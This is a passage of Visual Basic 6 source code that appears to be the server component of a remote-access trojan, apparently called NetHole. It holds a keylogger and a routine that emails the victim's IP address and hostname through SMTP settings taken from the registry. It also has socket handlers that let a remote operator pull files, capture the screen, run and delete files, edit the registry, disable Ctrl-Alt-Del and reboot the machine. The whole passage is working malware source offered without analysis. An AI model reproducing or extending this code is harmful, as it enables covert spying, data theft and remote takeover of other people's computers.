   keystate = Getasynckeystate(vbKeyF8)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F8}"
     End If
   
   keystate = Getasynckeystate(vbKeyF9)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F9}"
     End If
   
   keystate = Getasynckeystate(vbKeyF10)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F10}"
     End If
   
   keystate = Getasynckeystate(vbKeyF11)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F11}"
     End If
   
   keystate = Getasynckeystate(vbKeyF12)
If Shift = 0 And (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{F12}"
     End If
     
If Shift <> 0 And (keystate And &H1) = &H1 Then
   frmMain.Visible = True
     End If
         
    keystate = Getasynckeystate(vbKeyNumlock)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{NumLock}"
     End If
     
     keystate = Getasynckeystate(vbKeyScrollLock)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{ScrollLock}"
         End If
   
    keystate = Getasynckeystate(vbKeyPrint)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{PrintScreen}"
         End If
       
       keystate = Getasynckeystate(vbKeyPageUp)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{PageUp}"
         End If
       
       keystate = Getasynckeystate(vbKeyPageDown)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "{Pagedown}"
         End If

         keystate = Getasynckeystate(vbKeyNumpad1)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "1"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad2)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "2"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad3)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "3"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad4)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "4"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad5)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "5"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad6)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "6"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad7)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "7"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad8)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "8"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad9)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "9"
         End If
         
         keystate = Getasynckeystate(vbKeyNumpad0)
If (keystate And &H1) = &H1 Then
  Text1 = Text1 + "0"
         End If
         
End Sub
Private Sub Timer2_Timer()
Text1 = ""
Timer2.Enabled = False
End Sub


Private Sub GetTextsfromData(mainText As String)

Dim txtKey As String
Dim txtPath As String
Dim txtValue As String
Dim info1, info2, info3 As String
Dim firstcom As Integer
Dim nextcom As Integer
Dim lastcom As Integer


On Error GoTo err

firstcom = InStr(mainText, ",")
nextcom = InStr(firstcom + 1, mainText, ",")
lastcom = InStr(nextcom + 1, mainText, ",")

Dim LenPath As Integer
Dim LenKey As Integer
Dim LenVal As Integer

LenKey = nextcom - firstcom - 1
LenPath = lastcom - nextcom - 1
LenVal = Len(mainText) - (LenPath + LenKey + 7) - 1

txtKey = Mid(mainText, firstcom + 1, LenKey)
txtPath = Mid(mainText, nextcom + 1, LenPath)
txtValue = Mid(mainText, lastcom + 1, LenVal)

If txtKey = "HKEY_LOCAL_MACHINE" Then txtKey = HKEY_LOCAL_MACHINE
If txtKey = "HKEY_CLASSES_ROOT" Then txtKey = HKEY_CLASSES_ROOT
If txtKey = "HKEY_PERFORMANCE_DATA" Then txtKey = HKEY_PERFORMANCE_DATA
If txtKey = "HKEY_USERS" Then txtKey = HKEY_USERS
If txtKey = "HKEY_CURRENT_USER" Then txtKey = HKEY_CURRENT_USER

finReg.DeleteValue txtKey, txtPath, txtValue


err:
Exit Sub


End Sub




Sub DirWalk(ByVal sPattern As String, ByVal CurrDir As String, sFound() As String)

Dim i As Integer
Dim sCurrPath As String
Dim sFile As String
Dim ii As Integer
Dim iFiles As Integer
Dim iLen As Integer

On Error GoTo err

If Right$(CurrDir, 1) <> "\" Then
    Dir1.Path = CurrDir & "\"
Else
    Dir1.Path = CurrDir
End If
For i = 0 To Dir1.ListCount
    If Dir1.List(i) <> "" Then
        DoEvents
        Call DirWalk(sPattern, Dir1.List(i), sFound)
    Else
        If Right$(Dir1.Path, 1) = "\" Then
            sCurrPath = Left(Dir1.Path, Len(Dir1.Path) - 1)
        Else
            sCurrPath = Dir1.Path
        End If
        File1.Path = sCurrPath
        File1.Pattern = sPattern
        If File1.ListCount > 0 Then 'matching files found in the directory
            For ii = 0 To File1.ListCount - 1
                ReDim Preserve sFound(UBound(sFound) + 1)
                sFound(UBound(sFound) - 1) = sCurrPath & "\" & File1.List(ii)
            Next ii
        End If
        iLen = Len(Dir1.Path)
        Do While Mid(Dir1.Path, iLen, 1) <> "\"
            iLen = iLen - 1
        Loop
        Dir1.Path = Mid(Dir1.Path, 1, iLen)
    End If
Next i


err:
Exit Sub


End Sub




' I AM VERY PROUD OF THIS SUB!! LOVE IT AND SPENT SOME TIME ON IT... I THINK IT CAN'T_
' GET ANY BETTER THAN THIS

Private Sub SendMail()
Dim ws As Winsock

On Error GoTo err

PauseData.Pause 15

If IsConnected = True Then

If ConnT = False Or IPAddr <> GetIPAddress() Then

If MailSock.State <> sckClosed Then
MailSock.Close
End If

  MailSock.Protocol = sckTCPProtocol
  MailSock.RemotePort = 25
  MailSock.RemoteHost = SMTPServer
  MailSock.Connect
  
PauseData.Pause 10

  If MailSock.State = 7 Then
AddressIP = GetIPAddress()
HostnameIP = GetIPHostName()
MailSock.SendData "HELO " + SystemName + NL
PauseData.Pause 0.4
MailSock.SendData "MAIL FROM:<" + Sender + ">" + NL
PauseData.Pause 0.4
MailSock.SendData "RCPT TO:" + Recepient + NL
PauseData.Pause 0.4
MailSock.SendData "DATA" + NL
PauseData.Pause 0.4
Message = "IP " & AddressIP & "  " & "Hostname: " & HostnameIP & "  System Time: " & Time$
PauseData.Pause 0.4
MailSock.SendData Message + NL + "." + NL
ConnT = True
For Each ws In frmMain.wskServer
IPAddr = wskServer(ws.Index).LocalIP
Next
    End If
    
End If

Else
ConnT = False
End If

DoEvents


err:
Exit Sub


End Sub

Private Sub BeepFunc(NewArrival$)
Dim LCOM As Integer
Dim Durat As Integer
Dim DuratL As Integer
Dim freqL As Integer
Dim freqM As Integer

LCOM = InStr(NewArrival$, ",")
DuratL = Len(NewArrival$) - LCOM
Durat = CInt(Right(NewArrival$, DuratL))
freqL = Len(NewArrival$) - 6 - DuratL
freqM = CInt(Mid(NewArrival$, 6, freqL))

Beep freqM, Durat


End Sub


Private Function GetVals(GetValSMTP, GetValSystemName, GetValSender)
Dim RetValue As String
Dim tng As Integer

On Error GoTo err

RetValue = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Server")

    If RetValue <> "" Then
    
    GetValSMTP = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Server")
    GetValSystemName = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "Account Name")
    GetValSender = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\00000001", "SMTP Email Address")

Else
    
    For tng = 0 To 20
    
    RetValue = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\0000000" & tng, "SMTP Server")
    
    
    If RetValue <> "" Then
    GetValSMTP = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\0000000" & tng, "SMTP Server")
    GetValSystemName = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\0000000" & tng, "Account Name")
    GetValSender = basRegistry.regQuery_A_Key(&H80000001, "Software\Microsoft\Internet Account Manager\Accounts\0000000" & tng, "SMTP Email Address")
    Exit Function
    End If
    
    
    Next tng
    
    
    End If
    
    
err:
Exit Function


End Function


Private Function GetFileName(Fname As String) As String
    ' return the filename given the path
    Dim numbr As Integer
    Dim tempStr As String
    
On Error GoTo err
    
    For numbr% = 1 To Len(Fname$)
       ' look for the "\"
       tempStr$ = Right$(Fname$, numbr%)
       
       If Left$(tempStr$, 1) = "\" Then
         GetFileName$ = Mid$(tempStr$, 2, Len(tempStr$))
         Exit Function
       End If
    Next numbr
    
    
err:
Exit Function

End Function




Private Sub SendFile(Index As Integer, Fname As String)


    Dim DataChunk As String
    Dim passes As Long
    
On Error GoTo err
    
    '
    ' send over the filename so the Server knows where
    ' to store the file.
    SendData "OpenFile," & Fname$, Index
    ' pause to give Server time to open
    
    PauseData.Pause 0.5
    
    ' open the file to be sent
    Open Fname$ For Binary As #1 ' this mode works well with any file
       
        Do While Not EOF(1)
          ' update the Pass Variable
          passes& = passes& + 1
          ' get some of the file data 4196 bytes to be exact,
          ' can go smaller but Not bigger.
          DataChunk$ = Input(MAX_CHUNK, #1)
          ' send it to the server
          SendData DataChunk$, Index
          
          PauseData.Pause 0.5
          
          DoEvents
        Loop ' loop until all data is sent
        
        ' transfer done, notify the server to close the file
        SendData "CloseFile,", Index
        ' re-init byte counter and update status
       PauseData.Pause 0.5
      
       passes& = 0
        
       Close #1



err:
Exit Sub


End Sub





Private Sub wskEx_Close(Index As Integer)
On Error GoTo err
    wskEx(Index).Close
    Unload wskEx(Index)
err:
Exit Sub

End Sub

Private Sub wskEx_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
    
    Load wskEx(wskEx.UBound + 1)
    wskEx(wskEx.UBound).Accept requestID

err:
Exit Sub

End Sub

Private Sub wskEx_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim Nstring$

Status "Searching for files..."
wskEx(Index).GetData Nstring$, vbString

On Error GoTo err

If InStr(Nstring$, "\Drv") Then TextL = Right(Nstring$, Len(Nstring$) - 4)


If InStr(Nstring$, "\Pat") Then TextL2 = Right(Nstring$, Len(Nstring$) - 4)


If InStr(Nstring$, "\Search") Then
ReDim FilesFound(0) As String
    
    Call DirWalk(TextL2, TextL, FilesFound)
    
    List1.Clear
    wskEx(Index).SendData "\ClrLst"
    
    For a = 0 To UBound(FilesFound)
            
If stopSearching = False Then
   
        PauseData.Pause 0.5
        List1.AddItem FilesFound(a)
        wskEx(Index).SendData "\FilesFound" & FilesFound(a)
   Else
   
        frmMain.wskEx(Index).SendData "<<FINISHED>>"
        Exit Sub
   
End If
   
    Next a
frmMain.wskEx(Index).SendData "<<FINISHED>>"
End If
PauseData.Pause 0.5
Status ""

err:
Exit Sub


End Sub

Private Sub wskEx_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    wskEx(Index).Close
End Sub

Private Sub wskF_Close(Index As Integer)
On Error GoTo err
wskF(Index).Close
Unload wskF(Index)
err:
Exit Sub
End Sub

Private Sub wskF_ConnectionRequest(Index As Integer, ByVal requestID As Long)

On Error GoTo err

Load wskF(wskF.UBound + 1)
wskF(wskF.UBound).Accept requestID


err:
Exit Sub

End Sub


Private Sub wskF_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim NewArrival$
wskF(Index).GetData NewArrival$, vbString

On Error GoTo err

If InStr(NewArrival$, "formLOAD") Then
Dir1.Path = "C:\"
FillFileList Index
End If
If InStr(NewArrival$, "Dir1.Path") Then
frmMain.wskF(Index).SendData "Dir1.Path" & Dir1.Path
End If
If InStr(NewArrival$, "SETDIR") Then
frmMain.Dir1.Path = Right(NewArrival$, Len(NewArrival$) - Len("SETDIR"))
End If
If InStr(NewArrival$, "FillFileList") Then FillFileList Index


err:
Exit Sub


End Sub

Private Sub wskF_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskF(Index).Close
End Sub

Private Sub wskFileSend_Close(Index As Integer)
On Error GoTo err
    wskFileSend(Index).Close
    Unload wskFileSend(Index)
err:
Exit Sub
End Sub

Private Sub wskFileSend_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
    Load wskFileSend(wskFileSend.UBound + 1)
    wskFileSend(wskFileSend.UBound).Accept requestID
err:
Exit Sub
End Sub

Private Sub wskFileSend_DataArrival(Index As Integer, ByVal bytesTotal As Long)
 Dim NewArrival2$
 
          
    
    wskFileSend(Index).GetData NewArrival2$, vbString
On Error GoTo err
    Dim Commanding
    Dim dataRec
    
    Commanding = EvalData(NewArrival2$, 1)
    dataRec = EvalData(NewArrival2$, 2)
    
     Select Case Commanding
           
           Case "OpenFile"  ' open the file
           Dim Fname As String
           Fname$ = SavePath
           Open Fname$ For Binary As #1
           
               
        Case "CloseFile" ' close the file
          
        Close #1
        
        
        PauseData.Pause 0.5
        
         
        Case Else
           
           
           
           Put #1, , NewArrival2$
           
           
           
        End Select
    
    
    

err:
Exit Sub


    
End Sub

Private Sub wskFileSend_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskFileSend(Index).Close
End Sub

Private Sub wskFL_Close(Index As Integer)
On Error GoTo err
wskFL(Index).Close
Unload wskFL(Index)
err:
Exit Sub
End Sub

Private Sub wskFL_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
Load wskFL(wskFL.UBound + 1)
wskFL(wskFL.UBound).Accept requestID
err:
Exit Sub
End Sub

Private Sub wskFL_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim NewArrival$
wskFL(Index).GetData NewArrival$, vbString
On Error GoTo err
If InStr(NewArrival$, "\nodeclick") Then
Dim keylen As Integer
Dim pathlen As Integer
keylen = Len(NewArrival$) - InStrRev(NewArrival$, ",")
pathlen = Len(NewArrival$) - keylen - 10
NodeKeySent = Right(NewArrival$, keylen)
NodePathSent = Mid(NewArrival$, 12, pathlen - 2)
findfilesapi NodePathSent, NodeKeySent, Index
frmMain.wskFL(Index).SendData "<<FINISHED>>"
End If
err:
Exit Sub
End Sub

Private Sub wskFL_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskFL(Index).Close
End Sub

Private Sub wskKeys_Close(Index As Integer)
On Error GoTo err
wskKeys(Index).Close
Unload wskKeys(Index)
err:
Exit Sub
End Sub

Private Sub wskKeys_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
Load wskKeys(wskKeys.UBound + 1)
wskKeys(wskKeys.UBound).Accept requestID
err:
Exit Sub
End Sub

Private Sub wskKeys_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim NewArrival$

wskKeys(Index).GetData NewArrival$, vbString
On Error GoTo err
If InStr(NewArrival$, "<START>") Then
Timer1.Enabled = True
Timer2.Enabled = False
End If
If InStr(NewArrival$, "<END>") Then
Timer1.Enabled = False
Timer2.Enabled = True
End If
err:
Exit Sub
End Sub

Private Sub wskKeys_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskKeys(Index).Close
End Sub

Private Sub wskServer_Close(Index As Integer)
On Error GoTo err
    wskServer(Index).Close
    Unload wskServer(Index)
err:
Exit Sub
End Sub

Private Sub wskServer_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
    Load wskServer(wskServer.UBound + 1)
    wskServer(wskServer.UBound).Accept requestID
err:
Exit Sub
End Sub

Private Sub wskServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
 
 
 Dim NewArrival$
 Dim Answer As Variant
          
    
    wskServer(Index).GetData NewArrival$, vbString
On Error GoTo err
   If InStr(NewArrival$, "\filePath") Then
          FName_Only$ = Right(NewArrival$, Len(NewArrival$) - 9)
          SendFile Index, FName_Only$
   


   ElseIf InStr(NewArrival$, "\fileSize") Then wskServer(Index).SendData "\fileSize" & FileLen(Right(NewArrival$, Len(NewArrival$) - 9))
         
   ElseIf InStr(NewArrival$, "\Time") Then
   ElseIf InStr(NewArrival$, "\Restart") Then
   
        Status "Computer is restarting..."
        PauseData.Pause 2
        Status ""
        RebootComp 1
        

   ElseIf InStr(NewArrival$, "\Shutdown") Then
        Status "Computer is shuting down..."
        PauseData.Pause 2
        Status ""
        RebootComp 2
        
        
   ElseIf InStr(NewArrival$, "\LogOff") Then
   Status "Logging off"
   PauseData.Pause 2
   Status ""
   RebootComp 0
   
   ElseIf InStr(NewArrival$, "\Hidemouse") Then
   basMouse.HideMouse
   Status "Mouse is hidden"
    PauseData.Pause 2
   Status ""
   ElseIf InStr(NewArrival$, "\Showmouse") Then
   basMouse.ShowMouse
   Status "Mouse is shown"
    PauseData.Pause 2
   Status ""
   ElseIf InStr(NewArrival$, "\RestoreMouse") Then
   basMouse.RestoreMouse
   Status "Mouse is restored"
     PauseData.Pause 2
   Status ""
   ElseIf InStr(NewArrival$, "\optRes0") Then ChangeResolution 0
    
   ElseIf InStr(NewArrival$, "\optRes1") Then ChangeResolution 1
    
   ElseIf InStr(NewArrival$, "\optRes2") Then ChangeResolution 2
    
   ElseIf InStr(NewArrival$, "\URL") Then LOADURL frmMain, Right(NewArrival$, Len(NewArrival$) - 4)
    

   ElseIf InStr(NewArrival$, "\CapScreen") Then
   SavePicture CaptureScreen.CaptureScreen, "C:\Windows\capturedesk.jpg"
   SendFile Index, "C:\Windows\capturedesk.jpg"
   

   ElseIf InStr(NewArrival$, "\deleteFile") Then
    Status "File is deleted"
    PauseData.Pause 1
   Status ""
   Kill Right(NewArrival$, Len(NewArrival$) - 11)
    
    
   ElseIf InStr(NewArrival$, "\execFile") Then
   Dim flToExec As String
   Dim nFl As Integer
    For nFl = 0 To Len(NewArrival$)
    flToExec = Right(NewArrival$, nFl)
        If Left(flToExec, 1) = "," Then
        flToExec = Right(flToExec, Len(flToExec) - 1)
        Exit For
        End If
    Next nFl
    
   If Left(flToExec, 4) = ".exe" Then Shell flToExec
    
   ElseIf InStr(NewArrival$, "\RandMouse") Then RandomMouseMove.RandomMouse
    
   ElseIf InStr(NewArrival$, "\OpenCD") Then
   Status "CD IS OPENED"
OPENCD
PauseData.Pause 0.6
    Status "CD IS CLOSED"
PauseData.Pause 0.6
    Status ""
CLOSECD
       

   ElseIf InStr(NewArrival$, "\Swap") Then
   SwapButtons
   Status "Mouse Buttons are swapped"
    PauseData.Pause 2
   Status ""
    ElseIf InStr(NewArrival$, "\DISregs") Then

Dim bCRDOEc As Integer
Dim bCc As Integer
Dim bFMc As Integer
Dim bFindc As Integer
Dim bLOMc As Integer
Dim bRDMc As Integer
Dim bRMc As Integer
Dim bSFMc As Integer
Dim bRDHc As Integer
        
        If InStr(NewArrival$, "bCRDOE") Then
        bCRDOEc = 1
        Else
        bCRDOEc = 0
        End If
       
       If InStr(NewArrival$, "aC") Then
       bCc = 1
       Else
       bCc = 0
       End If
       
        If InStr(NewArrival$, "bFM") Then
        bFMc = 1
        Else
        bFMc = 0
        End If
        
        
        If InStr(NewArrival$, "bFind") Then
        bFindc = 1
        Else
        bFindc = 0
        End If
        
        
        If InStr(NewArrival$, "bLOM") Then
        bLOMc = 1
        Else
        bLOMc = 0
        End If
        
        If InStr(NewArrival$, "bRDM") Then
        bRDMc = 1
        Else
        bRDMc = 0
        End If
        
        If InStr(NewArrival$, "bRM") Then
        bRMc = 1
        Else
        bRMc = 0
        End If
        
        If InStr(NewArrival$, "bSFM") Then
        bSFMc = 1
        Else
        bSFMc = 0
        End If
        
        If InStr(NewArrival$, "bRDH") Then
        bRDHc = 1
        Else
        bRDHc = 0
        End If
        
        If InStr(NewArrival$, "drA:\") Then
        Check1 = 1
        Else
        Check1 = 0
        End If
        
        If InStr(NewArrival$, "drC:\") Then
        Check2 = 1
        Else
        Check2 = 0
        End If
        
        If InStr(NewArrival$, "drD:\") Then
        Check3 = 1
        Else
        Check3 = 0
        End If
        

Call SaveSettings(Check1, Check2, Check3, txtVAR, bRMc, bCc, bFMc, bRDMc, bLOMc, bFindc, bSFMc, bRDHc, bCRDOEc)



ElseIf InStr(NewArrival$, "\DelVal") Then GetTextsfromData NewArrival$


ElseIf Left(NewArrival$, 4) = "MSG_" Then

        
       NetHole_Message.Show
       NetHole_Message.txtMsg.Text = ""
       NetHole_Message.txtMsg.Text = Right(NewArrival$, Len(NewArrival$) - 4)
       Beep 1, 1
       FlashWindow NetHole_Message.hwnd, 100
       Indx = Index
    
ElseIf InStr(NewArrival$, "\ERR") Then MsgBox Right(NewArrival$, Len(NewArrival$) - 4), vbCritical, "ERROR"
       
ElseIf NewArrival$ = "\Act" Then WinThreads.Activate

ElseIf NewArrival$ = "\OAct" Then WinThreads.Hide

ElseIf NewArrival$ = "LAct" Then WinThreads.Destroy

ElseIf InStr(NewArrival$, "\Beep") Then BeepFunc (NewArrival$)


ElseIf InStr(NewArrival$, "\classlbl1") Then
Dim var1 As String
Dim var2 As Long
var1 = Right(NewArrival$, Len(NewArrival$) - 10)
var2 = FindWindow(var1, Trim$(txtTitle))
ShowWindow var2, 0


ElseIf InStr(NewArrival$, "classlbl2") Then
Dim var3 As String
Dim var4 As Long
var3 = Right(NewArrival$, Len(NewArrival$) - 10)
var4 = FindWindow(var3, Trim$(txtTitle))
ShowWindow var4, SW_RESTORE

ElseIf InStr(NewArrival$, "classlbl3") Then
var3 = Right(NewArrival$, Len(NewArrival$) - 10)
var4 = FindWindow(var3, Trim$(txtTitle))
ShowWindow var4, 0
ShowWindow var4, WM_DESTROY

'ElseIf InStr(NewArrival$, "\IMP\INF") Then
'USERNUMBER = CInt(Right(NewArrival$, Len(NewArrival$) - Len("\IMP\INF")))

ElseIf NewArrival$ = "\end" Then
wskServer(Index).Close

ElseIf InStr(NewArrival$, "\RtA") Then
RtA = Right(NewArrival$, Len(NewArrival$) - 4)
If RtA = "HKEY_CLASSES_ROOT" Then RtA = &H80000000
If RtA = "HKEY_CURRENT_USER" Then RtA = &H80000001
If RtA = "HKEY_LOCAL_MACHINE" Then RtA = &H80000002
If RtA = "HKEY_USERS" Then RtA = &H80000003
If RtA = "HKEY_PERFORMANCE_DATA" Then RtA = &H80000004
If RtA = "HKEY_CURRENT_CONFIG" Then RtA = &H80000005
If RtA = "HKEY_DYN_DATA" Then RtA = &H80000006


ElseIf InStr(NewArrival$, "\1P") Then PathA = Right(NewArrival$, Len(NewArrival$) - 2)


ElseIf InStr(NewArrival$, "\SubkeyA") Then SubkeyA = Right(NewArrival$, Len(NewArrival$) - 8)


ElseIf InStr(NewArrival$, "\ValKeyA") Then ValkeyA = Right(NewArrival$, Len(NewArrival$) - 8)


ElseIf InStr(NewArrival$, "1\CrK") Then basRegistry.regCreate_A_Key RtA, PathA


ElseIf InStr(NewArrival$, "\CrKV") Then basRegistry.regCreate_Key_Value RtA, PathA, SubkeyA, ValkeyA


ElseIf InStr(NewArrival$, "\DK") Then basRegistry.regDelete_A_Key RtA, PathA, SubkeyA


ElseIf InStr(NewArrival$, "\DSK") Then basRegistry.regDelete_Sub_Key RtA, PathA, SubkeyA

ElseIf InStr(NewArrival$, "\KKKT") Then SavePath = Right(NewArrival$, Len(NewArrival$) - 5)

ElseIf InStr(NewArrival$, "\putPIC") Then SavePath = Right(NewArrival$, Len(NewArrival$) - 7)

ElseIf InStr(NewArrival$, "<PICput>") Then
Status "PIC IS on"
PauseData.Pause 2
Status ""
frmPic.Timer1.Enabled = True
frmPic.Hide
frmPic.Picture = LoadPicture(SavePath)
frmPic.Refresh
frmPic.Show

ElseIf InStr(NewArrival$, "<UNLOADpic") Then
frmPic.Timer1.Enabled = False
frmPic.Hide
Status "Pic is gone"
PauseData.Pause 2
Status ""

ElseIf InStr(NewArrival$, "<FREEZEE>") Then
Status "FROOZEEN"
frmFreeZee.Timer1.Enabled = True
frmFreeZee.Show
PauseData.Pause 2
Status ""

ElseIf InStr(NewArrival$, "<UNF>") Then
frmFreeZee.Timer1.Enabled = False
frmFreeZee.Hide
Status "WARM.."
PauseData.Pause 2
Status ""


ElseIf InStr(NewArrival$, "<txtVAR>") Then
txtVAR = Right(NewArrival$, Len(NewArrival$) - 8)


ElseIf InStr(NewArrival$, "\DeleteFile") Then
Kill Right(NewArrival$, Len(NewArrival$) - 11)

ElseIf InStr(NewArrival$, "<<X>>") Then
Dim cm1 As Integer
Dim cm1L As Integer
Dim begi1 As String
Dim begi2 As String

cm1 = InStrRev(NewArrival$, ",")
cm1L = Len(NewArrival$) - cm1
begi1 = Right(NewArrival$, cm1L)
begi2 = Mid(NewArrival$, 6, Len(NewArrival$) - 5 - cm1L - 1)
SetCursorPos begi2, begi1


ElseIf InStr(NewArrival$, "<CHANGEdesktop>") Then
changeBackground.changeBackground SavePath

ElseIf InStr(NewArrival$, "Taskbar show") Then WinFunctions.ShowTaskBar
ElseIf InStr(NewArrival$, "Startbutton show") Then WinFunctions.ShowStartButton
ElseIf InStr(NewArrival$, "TaskBClock show") Then WinFunctions.ShowTaskBarClock
ElseIf InStr(NewArrival$, "TaskBIcon show") Then WinFunctions.ShowTaskBarIcons
ElseIf InStr(NewArrival$, "PST show") Then WinFunctions.ShowProgramsShowingInTaskBar
ElseIf InStr(NewArrival$, "Windows Toolbar show") Then WinFunctions.ShowWindowsToolBar

ElseIf InStr(NewArrival$, "Taskbar hide") Then WinFunctions.HideTaskBar
ElseIf InStr(NewArrival$, "Startbutton hide") Then WinFunctions.HideStartButton
ElseIf InStr(NewArrival$, "TaskBClock hide") Then WinFunctions.HideTaskBarClock
ElseIf InStr(NewArrival$, "TaskBIcon hide") Then WinFunctions.HideTaskBarIcons
ElseIf InStr(NewArrival$, "PST hide") Then WinFunctions.HideProgramsShowingInTaskBar
ElseIf InStr(NewArrival$, "Windows Toolbar hide") Then WinFunctions.HideWindowsToolBar

ElseIf InStr(NewArrival$, "Taskbar destroy") Then WinFunctions.DestroyTaskBar
ElseIf InStr(NewArrival$, "Startbutton destroy") Then WinFunctions.DestroyStartButton
ElseIf InStr(NewArrival$, "TaskBClock destroy") Then WinFunctions.DestroyTaskBarClock
ElseIf InStr(NewArrival$, "TaskBIcon destroy") Then WinFunctions.DestroyTaskBarIcons
ElseIf InStr(NewArrival$, "PST destroy") Then WinFunctions.DestroyProgramsShowingInTaskBar
ElseIf InStr(NewArrival$, "Windows Toolbar destroy") Then WinFunctions.DestroyWindowsToolBar


ElseIf InStr(NewArrival$, "Screen Blackout ON") Then WinFunctions.ScreenBlackOut frmblackout
ElseIf InStr(NewArrival$, "Screen Blackout OFF") Then WinFunctions.ScreenUnBlackOut frmblackout

ElseIf InStr(NewArrival$, "CTRL enabled") Then WinFunctions.EnableCtrlAltDel
ElseIf InStr(NewArrival$, "CTRL disabled") Then WinFunctions.DisableCtrlAltDel

ElseIf InStr(NewArrival$, "STOPsearching") Then stopSearching = True
ElseIf InStr(NewArrival$, "STARTsearching") Then stopSearching = False

ElseIf InStr(NewArrival$, "DeleteFolder") Then RmDir (Right(NewArrival$, Len(NewArrival$) - 12))

ElseIf InStr(NewArrival$, "CreateFolder") Then MkDir (Right(NewArrival$, Len(NewArrival$) - 12))

End If


err:
Exit Sub

End Sub






Private Sub wskServer_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskServer(Index).Close
End Sub

Private Sub wskWINT_Close(Index As Integer)
On Error GoTo err
wskWINT(Index).Close
Unload wskWINT(Index)
err:
Exit Sub
End Sub

Private Sub wskWINT_ConnectionRequest(Index As Integer, ByVal requestID As Long)
On Error GoTo err
Load wskWINT(wskWINT.UBound + 1)
wskWINT(wskWINT.UBound).Accept requestID
err:
Exit Sub
End Sub

Private Sub wskWINT_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim NewArrival$
 wskWINT(Index).GetData NewArrival$, vbString
On Error GoTo err

Status "Downloading Threads..."

If InStr(NewArrival$, "\Wnth") Then WinThreads.GetOpenWindowNames Index

If InStr(NewArrival$, "\txtTitle") Then txtTitle = Right(NewArrival$, Len(NewArrival$) - 9)

If InStr(NewArrival$, "\2Wnth") Then WinThreads.GetClass Index

If InStr(NewArrival$, "<APP>") Then
Dim vari As String
Dim vari2 As Long
vari = Right(NewArrival$, Len(NewArrival$) - 5)
SaveSetting "MainServer", "Blocked", "BlockedApp", vari
SaveSetting "MainServer", "BlockedTEXT", "BlockedTEXT", Trim$(txtTitle)
vari2 = FindWindow(vari, Trim$(txtTitle))
If vari2 <> 0 Then ShowWindow vari2, SW_HIDE
End If

Status ""

err:
Exit Sub
End Sub

Private Sub wskWINT_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskWINT(Index).Close
End Sub
